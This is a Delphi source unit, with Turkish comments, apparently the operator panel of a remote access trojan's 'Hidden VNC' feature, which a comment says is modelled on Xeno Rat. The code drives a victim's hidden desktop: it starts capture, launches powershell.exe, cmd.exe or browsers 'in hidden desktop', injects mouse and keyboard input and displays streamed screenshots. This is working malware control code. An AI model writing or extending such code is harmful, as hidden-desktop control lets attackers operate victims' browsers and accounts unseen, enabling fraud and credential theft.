unit UnitHiddenVNC;

interface

uses
  Winapi.Windows, Winapi.Messages,
  System.SysUtils, System.Variants, System.Classes, System.Types,
  System.JSON, System.SyncObjs,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls, Vcl.Imaging.jpeg,
  ncLines;

type
  TSendJSONProc   = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterProc = procedure(aLine: TncLine) of object;

  TForm10 = class;

  TDecodeThread = class(TThread)
  private
    FForm: TForm10;
  protected
    procedure Execute; override;
  public
    constructor Create(AForm: TForm10);
  end;

  TForm10 = class(TForm)
    Panel1    : TPanel;
    StatusBar1: TStatusBar;
    PaintBox1 : TPaintBox;
    Button1   : TButton;
    Button2   : TButton;
    Button3   : TButton;
    ComboBox1 : TComboBox;
    ComboBox2 : TComboBox;

    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure PaintBox1Paint(Sender: TObject);
    procedure ComboBox1Change(Sender: TObject);
    procedure PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure PaintBox1MouseMove(Sender: TObject; Shift: TShiftState;
      X, Y: Integer);
    procedure PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FormKeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FormKeyPress(Sender: TObject; var Key: Char);

  private
    FLine        : TncLine;
    FClientID    : string;
    FSendJSON    : TSendJSONProc;
    FUnregister  : TUnregisterProc;
    FIsCapturing : Boolean;

    FLock        : TCriticalSection;
    FPendingBytes: TBytes;
    FPendingFrameWidth : Integer;
    FPendingFrameHeight: Integer;
    FPendingFrameFormat: Integer;
    FPendingDirtyX     : Integer;
    FPendingDirtyY     : Integer;
    FPendingDirtyW     : Integer;
    FPendingDirtyH     : Integer;
    FPendingFPS         : Integer;
    FHasFrame    : Boolean;
    FIsDecoding  : Boolean;

    FDecodeThread: TDecodeThread;
    FDecodeEvent : TEvent;

    FBitmap      : TBitmap;
    FBitmapLock  : TCriticalSection;
    FLastWidth   : Integer;
    FLastHeight  : Integer;
    FLastMouseMoveTime : Cardinal;
    FFPSFrameCount     : Integer;
    FFPSLastTick       : Cardinal;

    FFocusedHwnd : UInt64;

    FPaintBoxActive : Boolean;
    FCharKeyDown    : set of Byte;   // karakteri hvnc_char ile gönderilen tuşlar

    procedure LogToStatus(const Msg: string);
    procedure UpdateFrameStatus(HeaderFPS: Integer);

    procedure SendControlCommand(const Action: string;
      X: Integer = -1; Y: Integer = -1;
      Button: Integer = -1; KeyCode: Integer = -1;
      InjectFocus: Boolean = False);

    procedure DisableChildFocus;
    procedure WMSetFocus(var Message: TWMSetFocus); message WM_SETFOCUS;

    function GetCharFromKey(Key: Word; out CharCode: Word): Boolean;
  public
    constructor Create(AOwner: TComponent); override;
    destructor  Destroy; override;

    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      ASendJSON: TSendJSONProc; AUnregister: TUnregisterProc);
    procedure DetachCallbacks;
    procedure HandleHVNCJSON(JSONObj: TJSONObject);
    procedure QueueFrameBytes(const Bytes: TBytes; FrameWidth: Integer = 0;
      FrameHeight: Integer = 0; FrameFormat: Integer = 1; DirtyX: Integer = 0;
      DirtyY: Integer = 0; DirtyW: Integer = 0; DirtyH: Integer = 0;
      FPS: Integer = 0);
  end;

var
  Form10: TForm10;

implementation

{$R *.dfm}

const
  HVNC_FRAME_FORMAT_JPEG_FULL  = 1;
  HVNC_FRAME_FORMAT_JPEG_DIRTY = 2;

// -------------------------------------------------------------------------
//  Yardımcı: Tuşun o anki klavye durumuna göre karakterini döndürür
// -------------------------------------------------------------------------
function TForm10.GetCharFromKey(Key: Word; out CharCode: Word): Boolean;
var
  State: TKeyboardState;
  ScanCode: UINT;
  OutChar: Word;
begin
  Result := False;
  CharCode := 0;

  // Modifier tuşlar asla karakter üretmez
  case Key of
    VK_SHIFT, VK_CONTROL, VK_MENU, VK_LWIN, VK_RWIN,
    VK_CAPITAL, VK_NUMLOCK, VK_SCROLL: Exit;
  end;

  ScanCode := MapVirtualKey(Key, 0);
  if ScanCode = 0 then Exit;

  GetKeyboardState(State);
  if ToAscii(Key, ScanCode, State, @OutChar, 0) = 1 then
  begin
    CharCode := OutChar;
    Result := True;
  end;
end;

// -------------------------------------------------------------------------
//  Constructor / Destructor
// -------------------------------------------------------------------------
constructor TForm10.Create(AOwner: TComponent);
begin
  inherited;
  DoubleBuffered := True;
  if Assigned(Panel1) then Panel1.DoubleBuffered := True;
  FLock           := TCriticalSection.Create;
  FBitmapLock     := TCriticalSection.Create;
  FBitmap         := TBitmap.Create;
  FIsCapturing    := False;
  FLastWidth      := 0;
  FLastHeight     := 0;
  FLastMouseMoveTime := 0;
  FFPSFrameCount := 0;
  FFPSLastTick := 0;
  FHasFrame       := False;
  FPendingFPS     := 0;
  FFocusedHwnd    := 0;
  FPaintBoxActive := False;
  KeyPreview      := True;
  FCharKeyDown    := [];

  FDecodeEvent  := TEvent.Create(nil, False, False, '');
  FDecodeThread := TDecodeThread.Create(Self);

  ComboBox1.Items.Clear;
  ComboBox1.Items.Add('10%');
  ComboBox1.Items.Add('20%');
  ComboBox1.Items.Add('30%');
  ComboBox1.Items.Add('40%');
  ComboBox1.Items.Add('50%');
  ComboBox1.Items.Add('60%');
  ComboBox1.Items.Add('70%');
  ComboBox1.Items.Add('80%');
  ComboBox1.Items.Add('90%');
  ComboBox1.Items.Add('100%');
  ComboBox1.ItemIndex := 4;

  ComboBox2.Items.Clear;
  ComboBox2.Items.Add('powershell.exe');
  ComboBox2.Items.Add('cmd.exe');
  ComboBox2.Items.Add('explorer.exe');
  ComboBox2.Items.Add('Google Chrome');
  ComboBox2.Items.Add('Microsoft Edge');
  ComboBox2.ItemIndex := 0;

  PaintBox1.ControlStyle := PaintBox1.ControlStyle + [csDoubleClicks, csOpaque];
end;

destructor TForm10.Destroy;
begin
  if Assigned(FDecodeThread) then
  begin
    FDecodeThread.Terminate;
    FDecodeEvent.SetEvent;
    FDecodeThread.WaitFor;
    FreeAndNil(FDecodeThread);
  end;
  FDecodeEvent.Free;
  FBitmap.Free;
  FBitmapLock.Free;
  FLock.Free;
  inherited;
end;

// -------------------------------------------------------------------------
//  Child focus engelleme
// -------------------------------------------------------------------------
procedure TForm10.DisableChildFocus;
var
  I: Integer;
begin
  for I := 0 to ControlCount - 1 do
  begin
    if Controls[I] is TButton then
      (Controls[I] as TButton).TabStop := False
    else if Controls[I] is TComboBox then
      (Controls[I] as TComboBox).TabStop := False;
  end;

  if Assigned(Panel1) then
    for I := 0 to Panel1.ControlCount - 1 do
    begin
      if Panel1.Controls[I] is TButton then
        (Panel1.Controls[I] as TButton).TabStop := False
      else if Panel1.Controls[I] is TComboBox then
        (Panel1.Controls[I] as TComboBox).TabStop := False;
    end;
end;

procedure TForm10.WMSetFocus(var Message: TWMSetFocus);
begin
  inherited;
  if FPaintBoxActive then
    ActiveControl := nil;
end;

// -------------------------------------------------------------------------
//  Public Setup
// -------------------------------------------------------------------------
procedure TForm10.SetupForClient(aLine: TncLine; const ClientID: string;
  ASendJSON: TSendJSONProc; AUnregister: TUnregisterProc);
begin
  FLine         := aLine;
  FClientID     := ClientID;
  FSendJSON     := ASendJSON;
  FUnregister   := AUnregister;
  Caption       := 'Hidden VNC - ' + FClientID;
  FFocusedHwnd  := 0;

  FIsCapturing    := False;
  Button1.Caption := 'Start Capturing';
  Button1.OnClick := Button1Click;
  Button2.OnClick := Button2Click;
  Button3.OnClick := Button3Click;
  ComboBox1.OnChange := ComboBox1Change;

  OnClose    := FormClose;
  OnKeyDown  := FormKeyDown;
  OnKeyUp    := FormKeyUp;
  OnKeyPress := FormKeyPress;

  PaintBox1.OnMouseDown := PaintBox1MouseDown;
  PaintBox1.OnMouseMove := PaintBox1MouseMove;
  PaintBox1.OnMouseUp   := PaintBox1MouseUp;
  PaintBox1.OnPaint     := PaintBox1Paint;

  DisableChildFocus;
  FCharKeyDown := [];
  LogToStatus('Ready');
end;

procedure TForm10.DetachCallbacks;
begin
  FLine       := nil;
  FSendJSON   := nil;
  FUnregister := nil;
end;

// -------------------------------------------------------------------------
//  Form Close
// -------------------------------------------------------------------------
procedure TForm10.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if FIsCapturing then
    Button1Click(nil);

  if Assigned(FUnregister) and Assigned(FLine) then
    FUnregister(FLine);

  Action := caFree;
end;

// -------------------------------------------------------------------------
//  Log ve FPS bilgisi
// -------------------------------------------------------------------------
procedure TForm10.LogToStatus(const Msg: string);
begin
  if not Assigned(StatusBar1) then Exit;
  StatusBar1.SimplePanel := True;
  StatusBar1.SimpleText := Msg;
  if StatusBar1.Panels.Count > 0 then
    StatusBar1.Panels[0].Text := Msg;
  StatusBar1.Update;
end;

procedure TForm10.UpdateFrameStatus(HeaderFPS: Integer);
var
  NowTick   : Cardinal;
  Elapsed   : Cardinal;
  RenderFPS : Integer;
begin
  Inc(FFPSFrameCount);
  NowTick := GetTickCount;
  if FFPSLastTick = 0 then
    FFPSLastTick := NowTick;
  Elapsed := NowTick - FFPSLastTick;
  if Elapsed < 1000 then
  begin
    if (FFPSFrameCount = 1) and (HeaderFPS > 0) then
      LogToStatus(Format('FPS: %d | Render: ... | %dx%d', [HeaderFPS, FLastWidth, FLastHeight]));
    Exit;
  end;
  RenderFPS := Round((FFPSFrameCount * 1000) / Elapsed);
  if HeaderFPS > 0 then
    LogToStatus(Format('FPS: %d | Render: %d | %dx%d', [HeaderFPS, RenderFPS, FLastWidth, FLastHeight]))
  else
    LogToStatus(Format('FPS: %d | %dx%d', [RenderFPS, FLastWidth, FLastHeight]));
  FFPSFrameCount := 0;
  FFPSLastTick := NowTick;
end;

// -------------------------------------------------------------------------
//  Frame kuyruğu ve JPEG decode (arka planda)
// -------------------------------------------------------------------------
procedure TForm10.QueueFrameBytes(const Bytes: TBytes; FrameWidth: Integer;
  FrameHeight: Integer; FrameFormat: Integer; DirtyX: Integer; DirtyY: Integer;
  DirtyW: Integer; DirtyH: Integer; FPS: Integer);
begin
  if (csDestroying in ComponentState) then Exit;

  FLock.Enter;
  try
    FPendingBytes       := Copy(Bytes);
    FPendingFrameWidth  := FrameWidth;
    FPendingFrameHeight := FrameHeight;
    FPendingFrameFormat := FrameFormat;
    FPendingDirtyX      := DirtyX;
    FPendingDirtyY      := DirtyY;
    FPendingDirtyW      := DirtyW;
    FPendingDirtyH      := DirtyH;
    FPendingFPS         := FPS;
    FHasFrame           := True;
    FDecodeEvent.SetEvent;
  finally
    FLock.Leave;
  end;
end;

{ TDecodeThread }

constructor TDecodeThread.Create(AForm: TForm10);
begin
  inherited Create(False);
  FForm := AForm;
  FreeOnTerminate := False;
end;

procedure TDecodeThread.Execute;
var
  LocalBytes : TBytes;
  LocalWidth, LocalHeight, LocalFormat: Integer;
  LocalDirtyX, LocalDirtyY, LocalDirtyW, LocalDirtyH: Integer;
  LocalFPS: Integer;
  MS: TMemoryStream;
  JPG: TJPEGImage;
  TempBmp: TBitmap;
begin
  MS := TMemoryStream.Create;
  JPG := TJPEGImage.Create;
  try
    while not Terminated do
    begin
      if FForm.FDecodeEvent.WaitFor(INFINITE) <> wrSignaled then Continue;
      if Terminated then Break;

      FForm.FLock.Enter;
      try
        LocalBytes  := FForm.FPendingBytes;
        LocalWidth  := FForm.FPendingFrameWidth;
        LocalHeight := FForm.FPendingFrameHeight;
        LocalFormat := FForm.FPendingFrameFormat;
        LocalDirtyX := FForm.FPendingDirtyX;
        LocalDirtyY := FForm.FPendingDirtyY;
        LocalDirtyW := FForm.FPendingDirtyW;
        LocalDirtyH := FForm.FPendingDirtyH;
        LocalFPS    := FForm.FPendingFPS;

        FForm.FPendingBytes := nil;
        FForm.FHasFrame     := False;
      finally
        FForm.FLock.Leave;
      end;

      if Length(LocalBytes) = 0 then Continue;

      TempBmp := TBitmap.Create;
      try
        MS.Clear;
        MS.WriteBuffer(LocalBytes[0], Length(LocalBytes));
        MS.Position := 0;
        try
          JPG.LoadFromStream(MS);
          TempBmp.Assign(JPG);

          TThread.Queue(nil,
            procedure
            begin
              if (csDestroying in FForm.ComponentState) then
              begin
                TempBmp.Free;
                Exit;
              end;

              FForm.FBitmapLock.Enter;
              try
                if (LocalWidth <= 0) or (LocalHeight <= 0) then
                  FForm.FBitmap.Assign(TempBmp)
                else if (LocalFormat = HVNC_FRAME_FORMAT_JPEG_DIRTY) then
                begin
                  if (FForm.FBitmap.Width <> LocalWidth) or (FForm.FBitmap.Height <> LocalHeight) then
                  begin
                    FForm.FBitmap.PixelFormat := pf24bit;
                    FForm.FBitmap.SetSize(LocalWidth, LocalHeight);
                    FForm.FBitmap.Canvas.Brush.Color := clBlack;
                    FForm.FBitmap.Canvas.FillRect(Rect(0, 0, LocalWidth, LocalHeight));
                  end;

                  if (LocalDirtyW <= 0) or (LocalDirtyH <= 0) then
                    FForm.FBitmap.Canvas.Draw(LocalDirtyX, LocalDirtyY, TempBmp)
                  else
                    FForm.FBitmap.Canvas.StretchDraw(Rect(LocalDirtyX, LocalDirtyY,
                      LocalDirtyX + LocalDirtyW, LocalDirtyY + LocalDirtyH), TempBmp);
                end
                else
                  FForm.FBitmap.Assign(TempBmp);

                FForm.FLastWidth  := FForm.FBitmap.Width;
                FForm.FLastHeight := FForm.FBitmap.Height;
              finally
                FForm.FBitmapLock.Leave;
                TempBmp.Free;
              end;
              FForm.PaintBox1.Invalidate;
              FForm.UpdateFrameStatus(LocalFPS);
            end);
        except
          TempBmp.Free;
        end;
      except
        TempBmp.Free;
      end;
    end;
  finally
    JPG.Free;
    MS.Free;
  end;
end;

// -------------------------------------------------------------------------
//  JSON kontrol komutu gönder
// -------------------------------------------------------------------------
procedure TForm10.SendControlCommand(const Action: string;
  X, Y, Button, KeyCode: Integer; InjectFocus: Boolean);
var
  JSONObj : TJSONObject;
  NormX   : Integer;
  NormY   : Integer;
begin
  if not FIsCapturing or not Assigned(FSendJSON) or not Assigned(FLine) then
    Exit;

  NormX := 0;
  NormY := 0;
  if (X <> -1) and (PaintBox1.Width > 0) then
    NormX := Round((X / PaintBox1.Width)  * 65535);
  if (Y <> -1) and (PaintBox1.Height > 0) then
    NormY := Round((Y / PaintBox1.Height) * 65535);

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', Action);
    if X       <> -1 then JSONObj.AddPair('x',       TJSONNumber.Create(NormX));
    if Y       <> -1 then JSONObj.AddPair('y',       TJSONNumber.Create(NormY));
    if Button  <> -1 then JSONObj.AddPair('button',  TJSONNumber.Create(Button));
    if KeyCode <> -1 then JSONObj.AddPair('keycode', TJSONNumber.Create(KeyCode));
    if InjectFocus and (FFocusedHwnd <> 0) then
      JSONObj.AddPair('focused_hwnd', TJSONNumber.Create(FFocusedHwnd));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

// -------------------------------------------------------------------------
//  Buton tıklamaları
// -------------------------------------------------------------------------
procedure TForm10.Button1Click(Sender: TObject);
var
  JSONObj    : TJSONObject;
  QualityStr : string;
  QualityVal : Integer;
begin
  if not Assigned(FSendJSON) or not Assigned(FLine) then Exit;

  FIsCapturing := not FIsCapturing;

  JSONObj := TJSONObject.Create;
  try
    if FIsCapturing then
    begin
      QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
      QualityVal := StrToIntDef(QualityStr, 50);
      JSONObj.AddPair('action',  'hvnc_start');
      JSONObj.AddPair('quality', TJSONNumber.Create(QualityVal));
      Button1.Caption := 'Stop Capturing';
      FFPSFrameCount := 0;
      FFPSLastTick := 0;
      LogToStatus('Starting Hidden VNC...');
    end
    else
    begin
      JSONObj.AddPair('action', 'hvnc_stop');
      Button1.Caption  := 'Start Capturing';
      FFocusedHwnd     := 0;
      FPaintBoxActive  := False;
      LogToStatus('Stopping Hidden VNC...');
    end;
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;

  ActiveControl := nil;
  SetFocus;
end;

procedure TForm10.Button2Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'hvnc_run');
    JSONObj.AddPair('path',   ComboBox2.Text);
    FSendJSON(FLine, JSONObj);
    LogToStatus('Executing ' + ComboBox2.Text + ' in hidden desktop...');
  finally
    JSONObj.Free;
  end;

  ActiveControl := nil;
  SetFocus;
end;

procedure TForm10.Button3Click(Sender: TObject);
var
  SD  : TSaveDialog;
  JPG : TJPEGImage;
begin
  if FBitmap.Empty then
  begin
    LogToStatus('No frame to save.');
    Exit;
  end;

  SD := TSaveDialog.Create(Self);
  try
    SD.Title      := 'Save Screenshot';
    SD.DefaultExt := 'jpg';
    SD.Filter     := 'JPEG Image (*.jpg)|*.jpg';
    SD.FileName   := 'hvnc_' + FClientID + '_' +
                     FormatDateTime('yyyymmdd_hhnnss', Now) + '.jpg';
    if SD.Execute then
    begin
      JPG := TJPEGImage.Create;
      try
        JPG.Assign(FBitmap);
        JPG.SaveToFile(SD.FileName);
        LogToStatus('Screenshot saved: ' + ExtractFileName(SD.FileName));
      finally
        JPG.Free;
      end;
    end;
  finally
    SD.Free;
  end;

  ActiveControl := nil;
  SetFocus;
end;

// -------------------------------------------------------------------------
//  ComboBox kalite değişimi
// -------------------------------------------------------------------------
procedure TForm10.ComboBox1Change(Sender: TObject);
var
  JSONObj    : TJSONObject;
  QualityStr : string;
  QualityVal : Integer;
begin
  if not FIsCapturing or not Assigned(FSendJSON) or not Assigned(FLine) then
    Exit;

  QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
  QualityVal := StrToIntDef(QualityStr, 50);

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action',  'hvnc_quality');
    JSONObj.AddPair('quality', TJSONNumber.Create(QualityVal));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;

  ActiveControl := nil;
  SetFocus;
end;

// -------------------------------------------------------------------------
//  JSON mesaj işleme (yanıtlar)
// -------------------------------------------------------------------------
procedure TForm10.HandleHVNCJSON(JSONObj: TJSONObject);
var
  Action   : string;
  HwndVal  : TJSONValue;
  HwndNum  : UInt64;
begin
  if not Assigned(JSONObj) then Exit;
  if not Assigned(JSONObj.GetValue('action')) then Exit;

  Action := JSONObj.GetValue('action').Value;

  if Action = 'hvnc_status' then
  begin
    if Assigned(JSONObj.Values['message']) then
      LogToStatus(JSONObj.Values['message'].Value);
  end
  else if Action = 'hvnc_error' then
  begin
    if Assigned(JSONObj.Values['message']) then
    begin
      LogToStatus('Error: ' + JSONObj.Values['message'].Value);
      FIsCapturing    := False;
      Button1.Caption := 'Start Capturing';
      FFocusedHwnd    := 0;
      FPaintBoxActive := False;
    end;
  end
  else if Action = 'hvnc_focus_ack' then
  begin
    HwndVal := JSONObj.Values['hwnd'];
    if Assigned(HwndVal) then
    begin
      try
        HwndNum := StrToUInt64(HwndVal.Value);
        if HwndNum <> FFocusedHwnd then
        begin
          FFocusedHwnd := HwndNum;
          LogToStatus('Focus: HWND 0x' + IntToHex(FFocusedHwnd, 8));
        end;
      except
      end;
    end;
  end;
end;

// -------------------------------------------------------------------------
//  PaintBox boyama
// -------------------------------------------------------------------------
procedure TForm10.PaintBox1Paint(Sender: TObject);
begin
  FBitmapLock.Enter;
  try
    if not FBitmap.Empty then
      PaintBox1.Canvas.StretchDraw(PaintBox1.ClientRect, FBitmap);
  finally
    FBitmapLock.Leave;
  end;
end;

// -------------------------------------------------------------------------
//  Mouse olayları
// -------------------------------------------------------------------------
procedure TForm10.PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  BtnIdx: Integer;
  Action: string;
begin
  BtnIdx := 0;
  if Button = mbRight  then BtnIdx := 1;
  if Button = mbMiddle then BtnIdx := 2;

  Action := 'hvnc_mousedown';
  if ssDouble in Shift then
    Action := 'hvnc_doubleclick';

  FPaintBoxActive := True;
  ActiveControl   := nil;
  SetFocus;

  SendControlCommand(Action, X, Y, BtnIdx, -1, False);
end;

procedure TForm10.PaintBox1MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
  if GetTickCount - FLastMouseMoveTime < 30 then Exit;
  FLastMouseMoveTime := GetTickCount;
  SendControlCommand('hvnc_mousemove', X, Y, -1, -1, False);
end;

procedure TForm10.PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  BtnIdx: Integer;
begin
  BtnIdx := 0;
  if Button = mbRight  then BtnIdx := 1;
  if Button = mbMiddle then BtnIdx := 2;
  SendControlCommand('hvnc_mouseup', X, Y, BtnIdx, -1, False);
end;

// -------------------------------------------------------------------------
//  Yeni Klavye İşleyicileri (Xeno Rat stili)
//  - Karakter üreten tuşlarda yalnızca hvnc_char gönderilir
//  - Modifier tuşlar normal keydown/keyup iletilir
// -------------------------------------------------------------------------
procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  OriginalKey: Word;
  CharCode: Word;
  IsCtrl, IsAlt: Boolean;
begin
  if not FPaintBoxActive then Exit;

  OriginalKey := Key;

  IsCtrl := (GetKeyState(VK_CONTROL) < 0);
  IsAlt  := (GetKeyState(VK_MENU) < 0);

  // Enter / Space'in UI butonunu tetiklemesini engelle
  if (Key = VK_RETURN) or (Key = VK_SPACE) then
    Key := 0;

  // AltGr handling
  if (OriginalKey = VK_MENU) and (GetKeyState(VK_RMENU) < 0) then
    OriginalKey := VK_RMENU;

  // CTRL Shortcuts
  if IsCtrl and (OriginalKey in [Ord('A'), Ord('C'), Ord('V'), Ord('X'), Ord('Z')]) then
  begin
    SendControlCommand('hvnc_keydown', -1, -1, -1, OriginalKey, True);
    Exit;
  end;

  if GetCharFromKey(OriginalKey, CharCode) then
  begin
    // Yalnızca yazdırılabilir karakterleri (boşluk dahil >= 32) hvnc_char gönder
    if (CharCode >= 32) and not IsCtrl and not IsAlt then
    begin
      SendControlCommand('hvnc_char', -1, -1, -1, CharCode, True);
      Include(FCharKeyDown, OriginalKey);
    end
    else
    begin
      // Enter, Tab gibi kontrol karakterlerini normal tuş olarak gönder
      SendControlCommand('hvnc_keydown', -1, -1, -1, OriginalKey, True);
    end;
  end
  else
  begin
    // Ok tuşları, F1-F12, Shift, Ctrl, Alt vb.
    SendControlCommand('hvnc_keydown', -1, -1, -1, OriginalKey, True);
  end;
end;

procedure TForm10.FormKeyUp(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  OriginalKey: Word;
begin
  if not FPaintBoxActive then Exit;
  OriginalKey := Key;

  if (OriginalKey = VK_MENU) and (GetKeyState(VK_RMENU) < 0) then
    OriginalKey := VK_RMENU;

  // Eğer tuş hvnc_char ile gönderildiyse keyup atlanır
  if OriginalKey in FCharKeyDown then
  begin
    Exclude(FCharKeyDown, OriginalKey);
    Exit;
  end;

  SendControlCommand('hvnc_keyup', -1, -1, -1, OriginalKey, True);
end;

procedure TForm10.FormKeyPress(Sender: TObject; var Key: Char);
begin
  // Artık kullanılmıyor; karakter işleme FormKeyDown'a taşındı
end;

end.
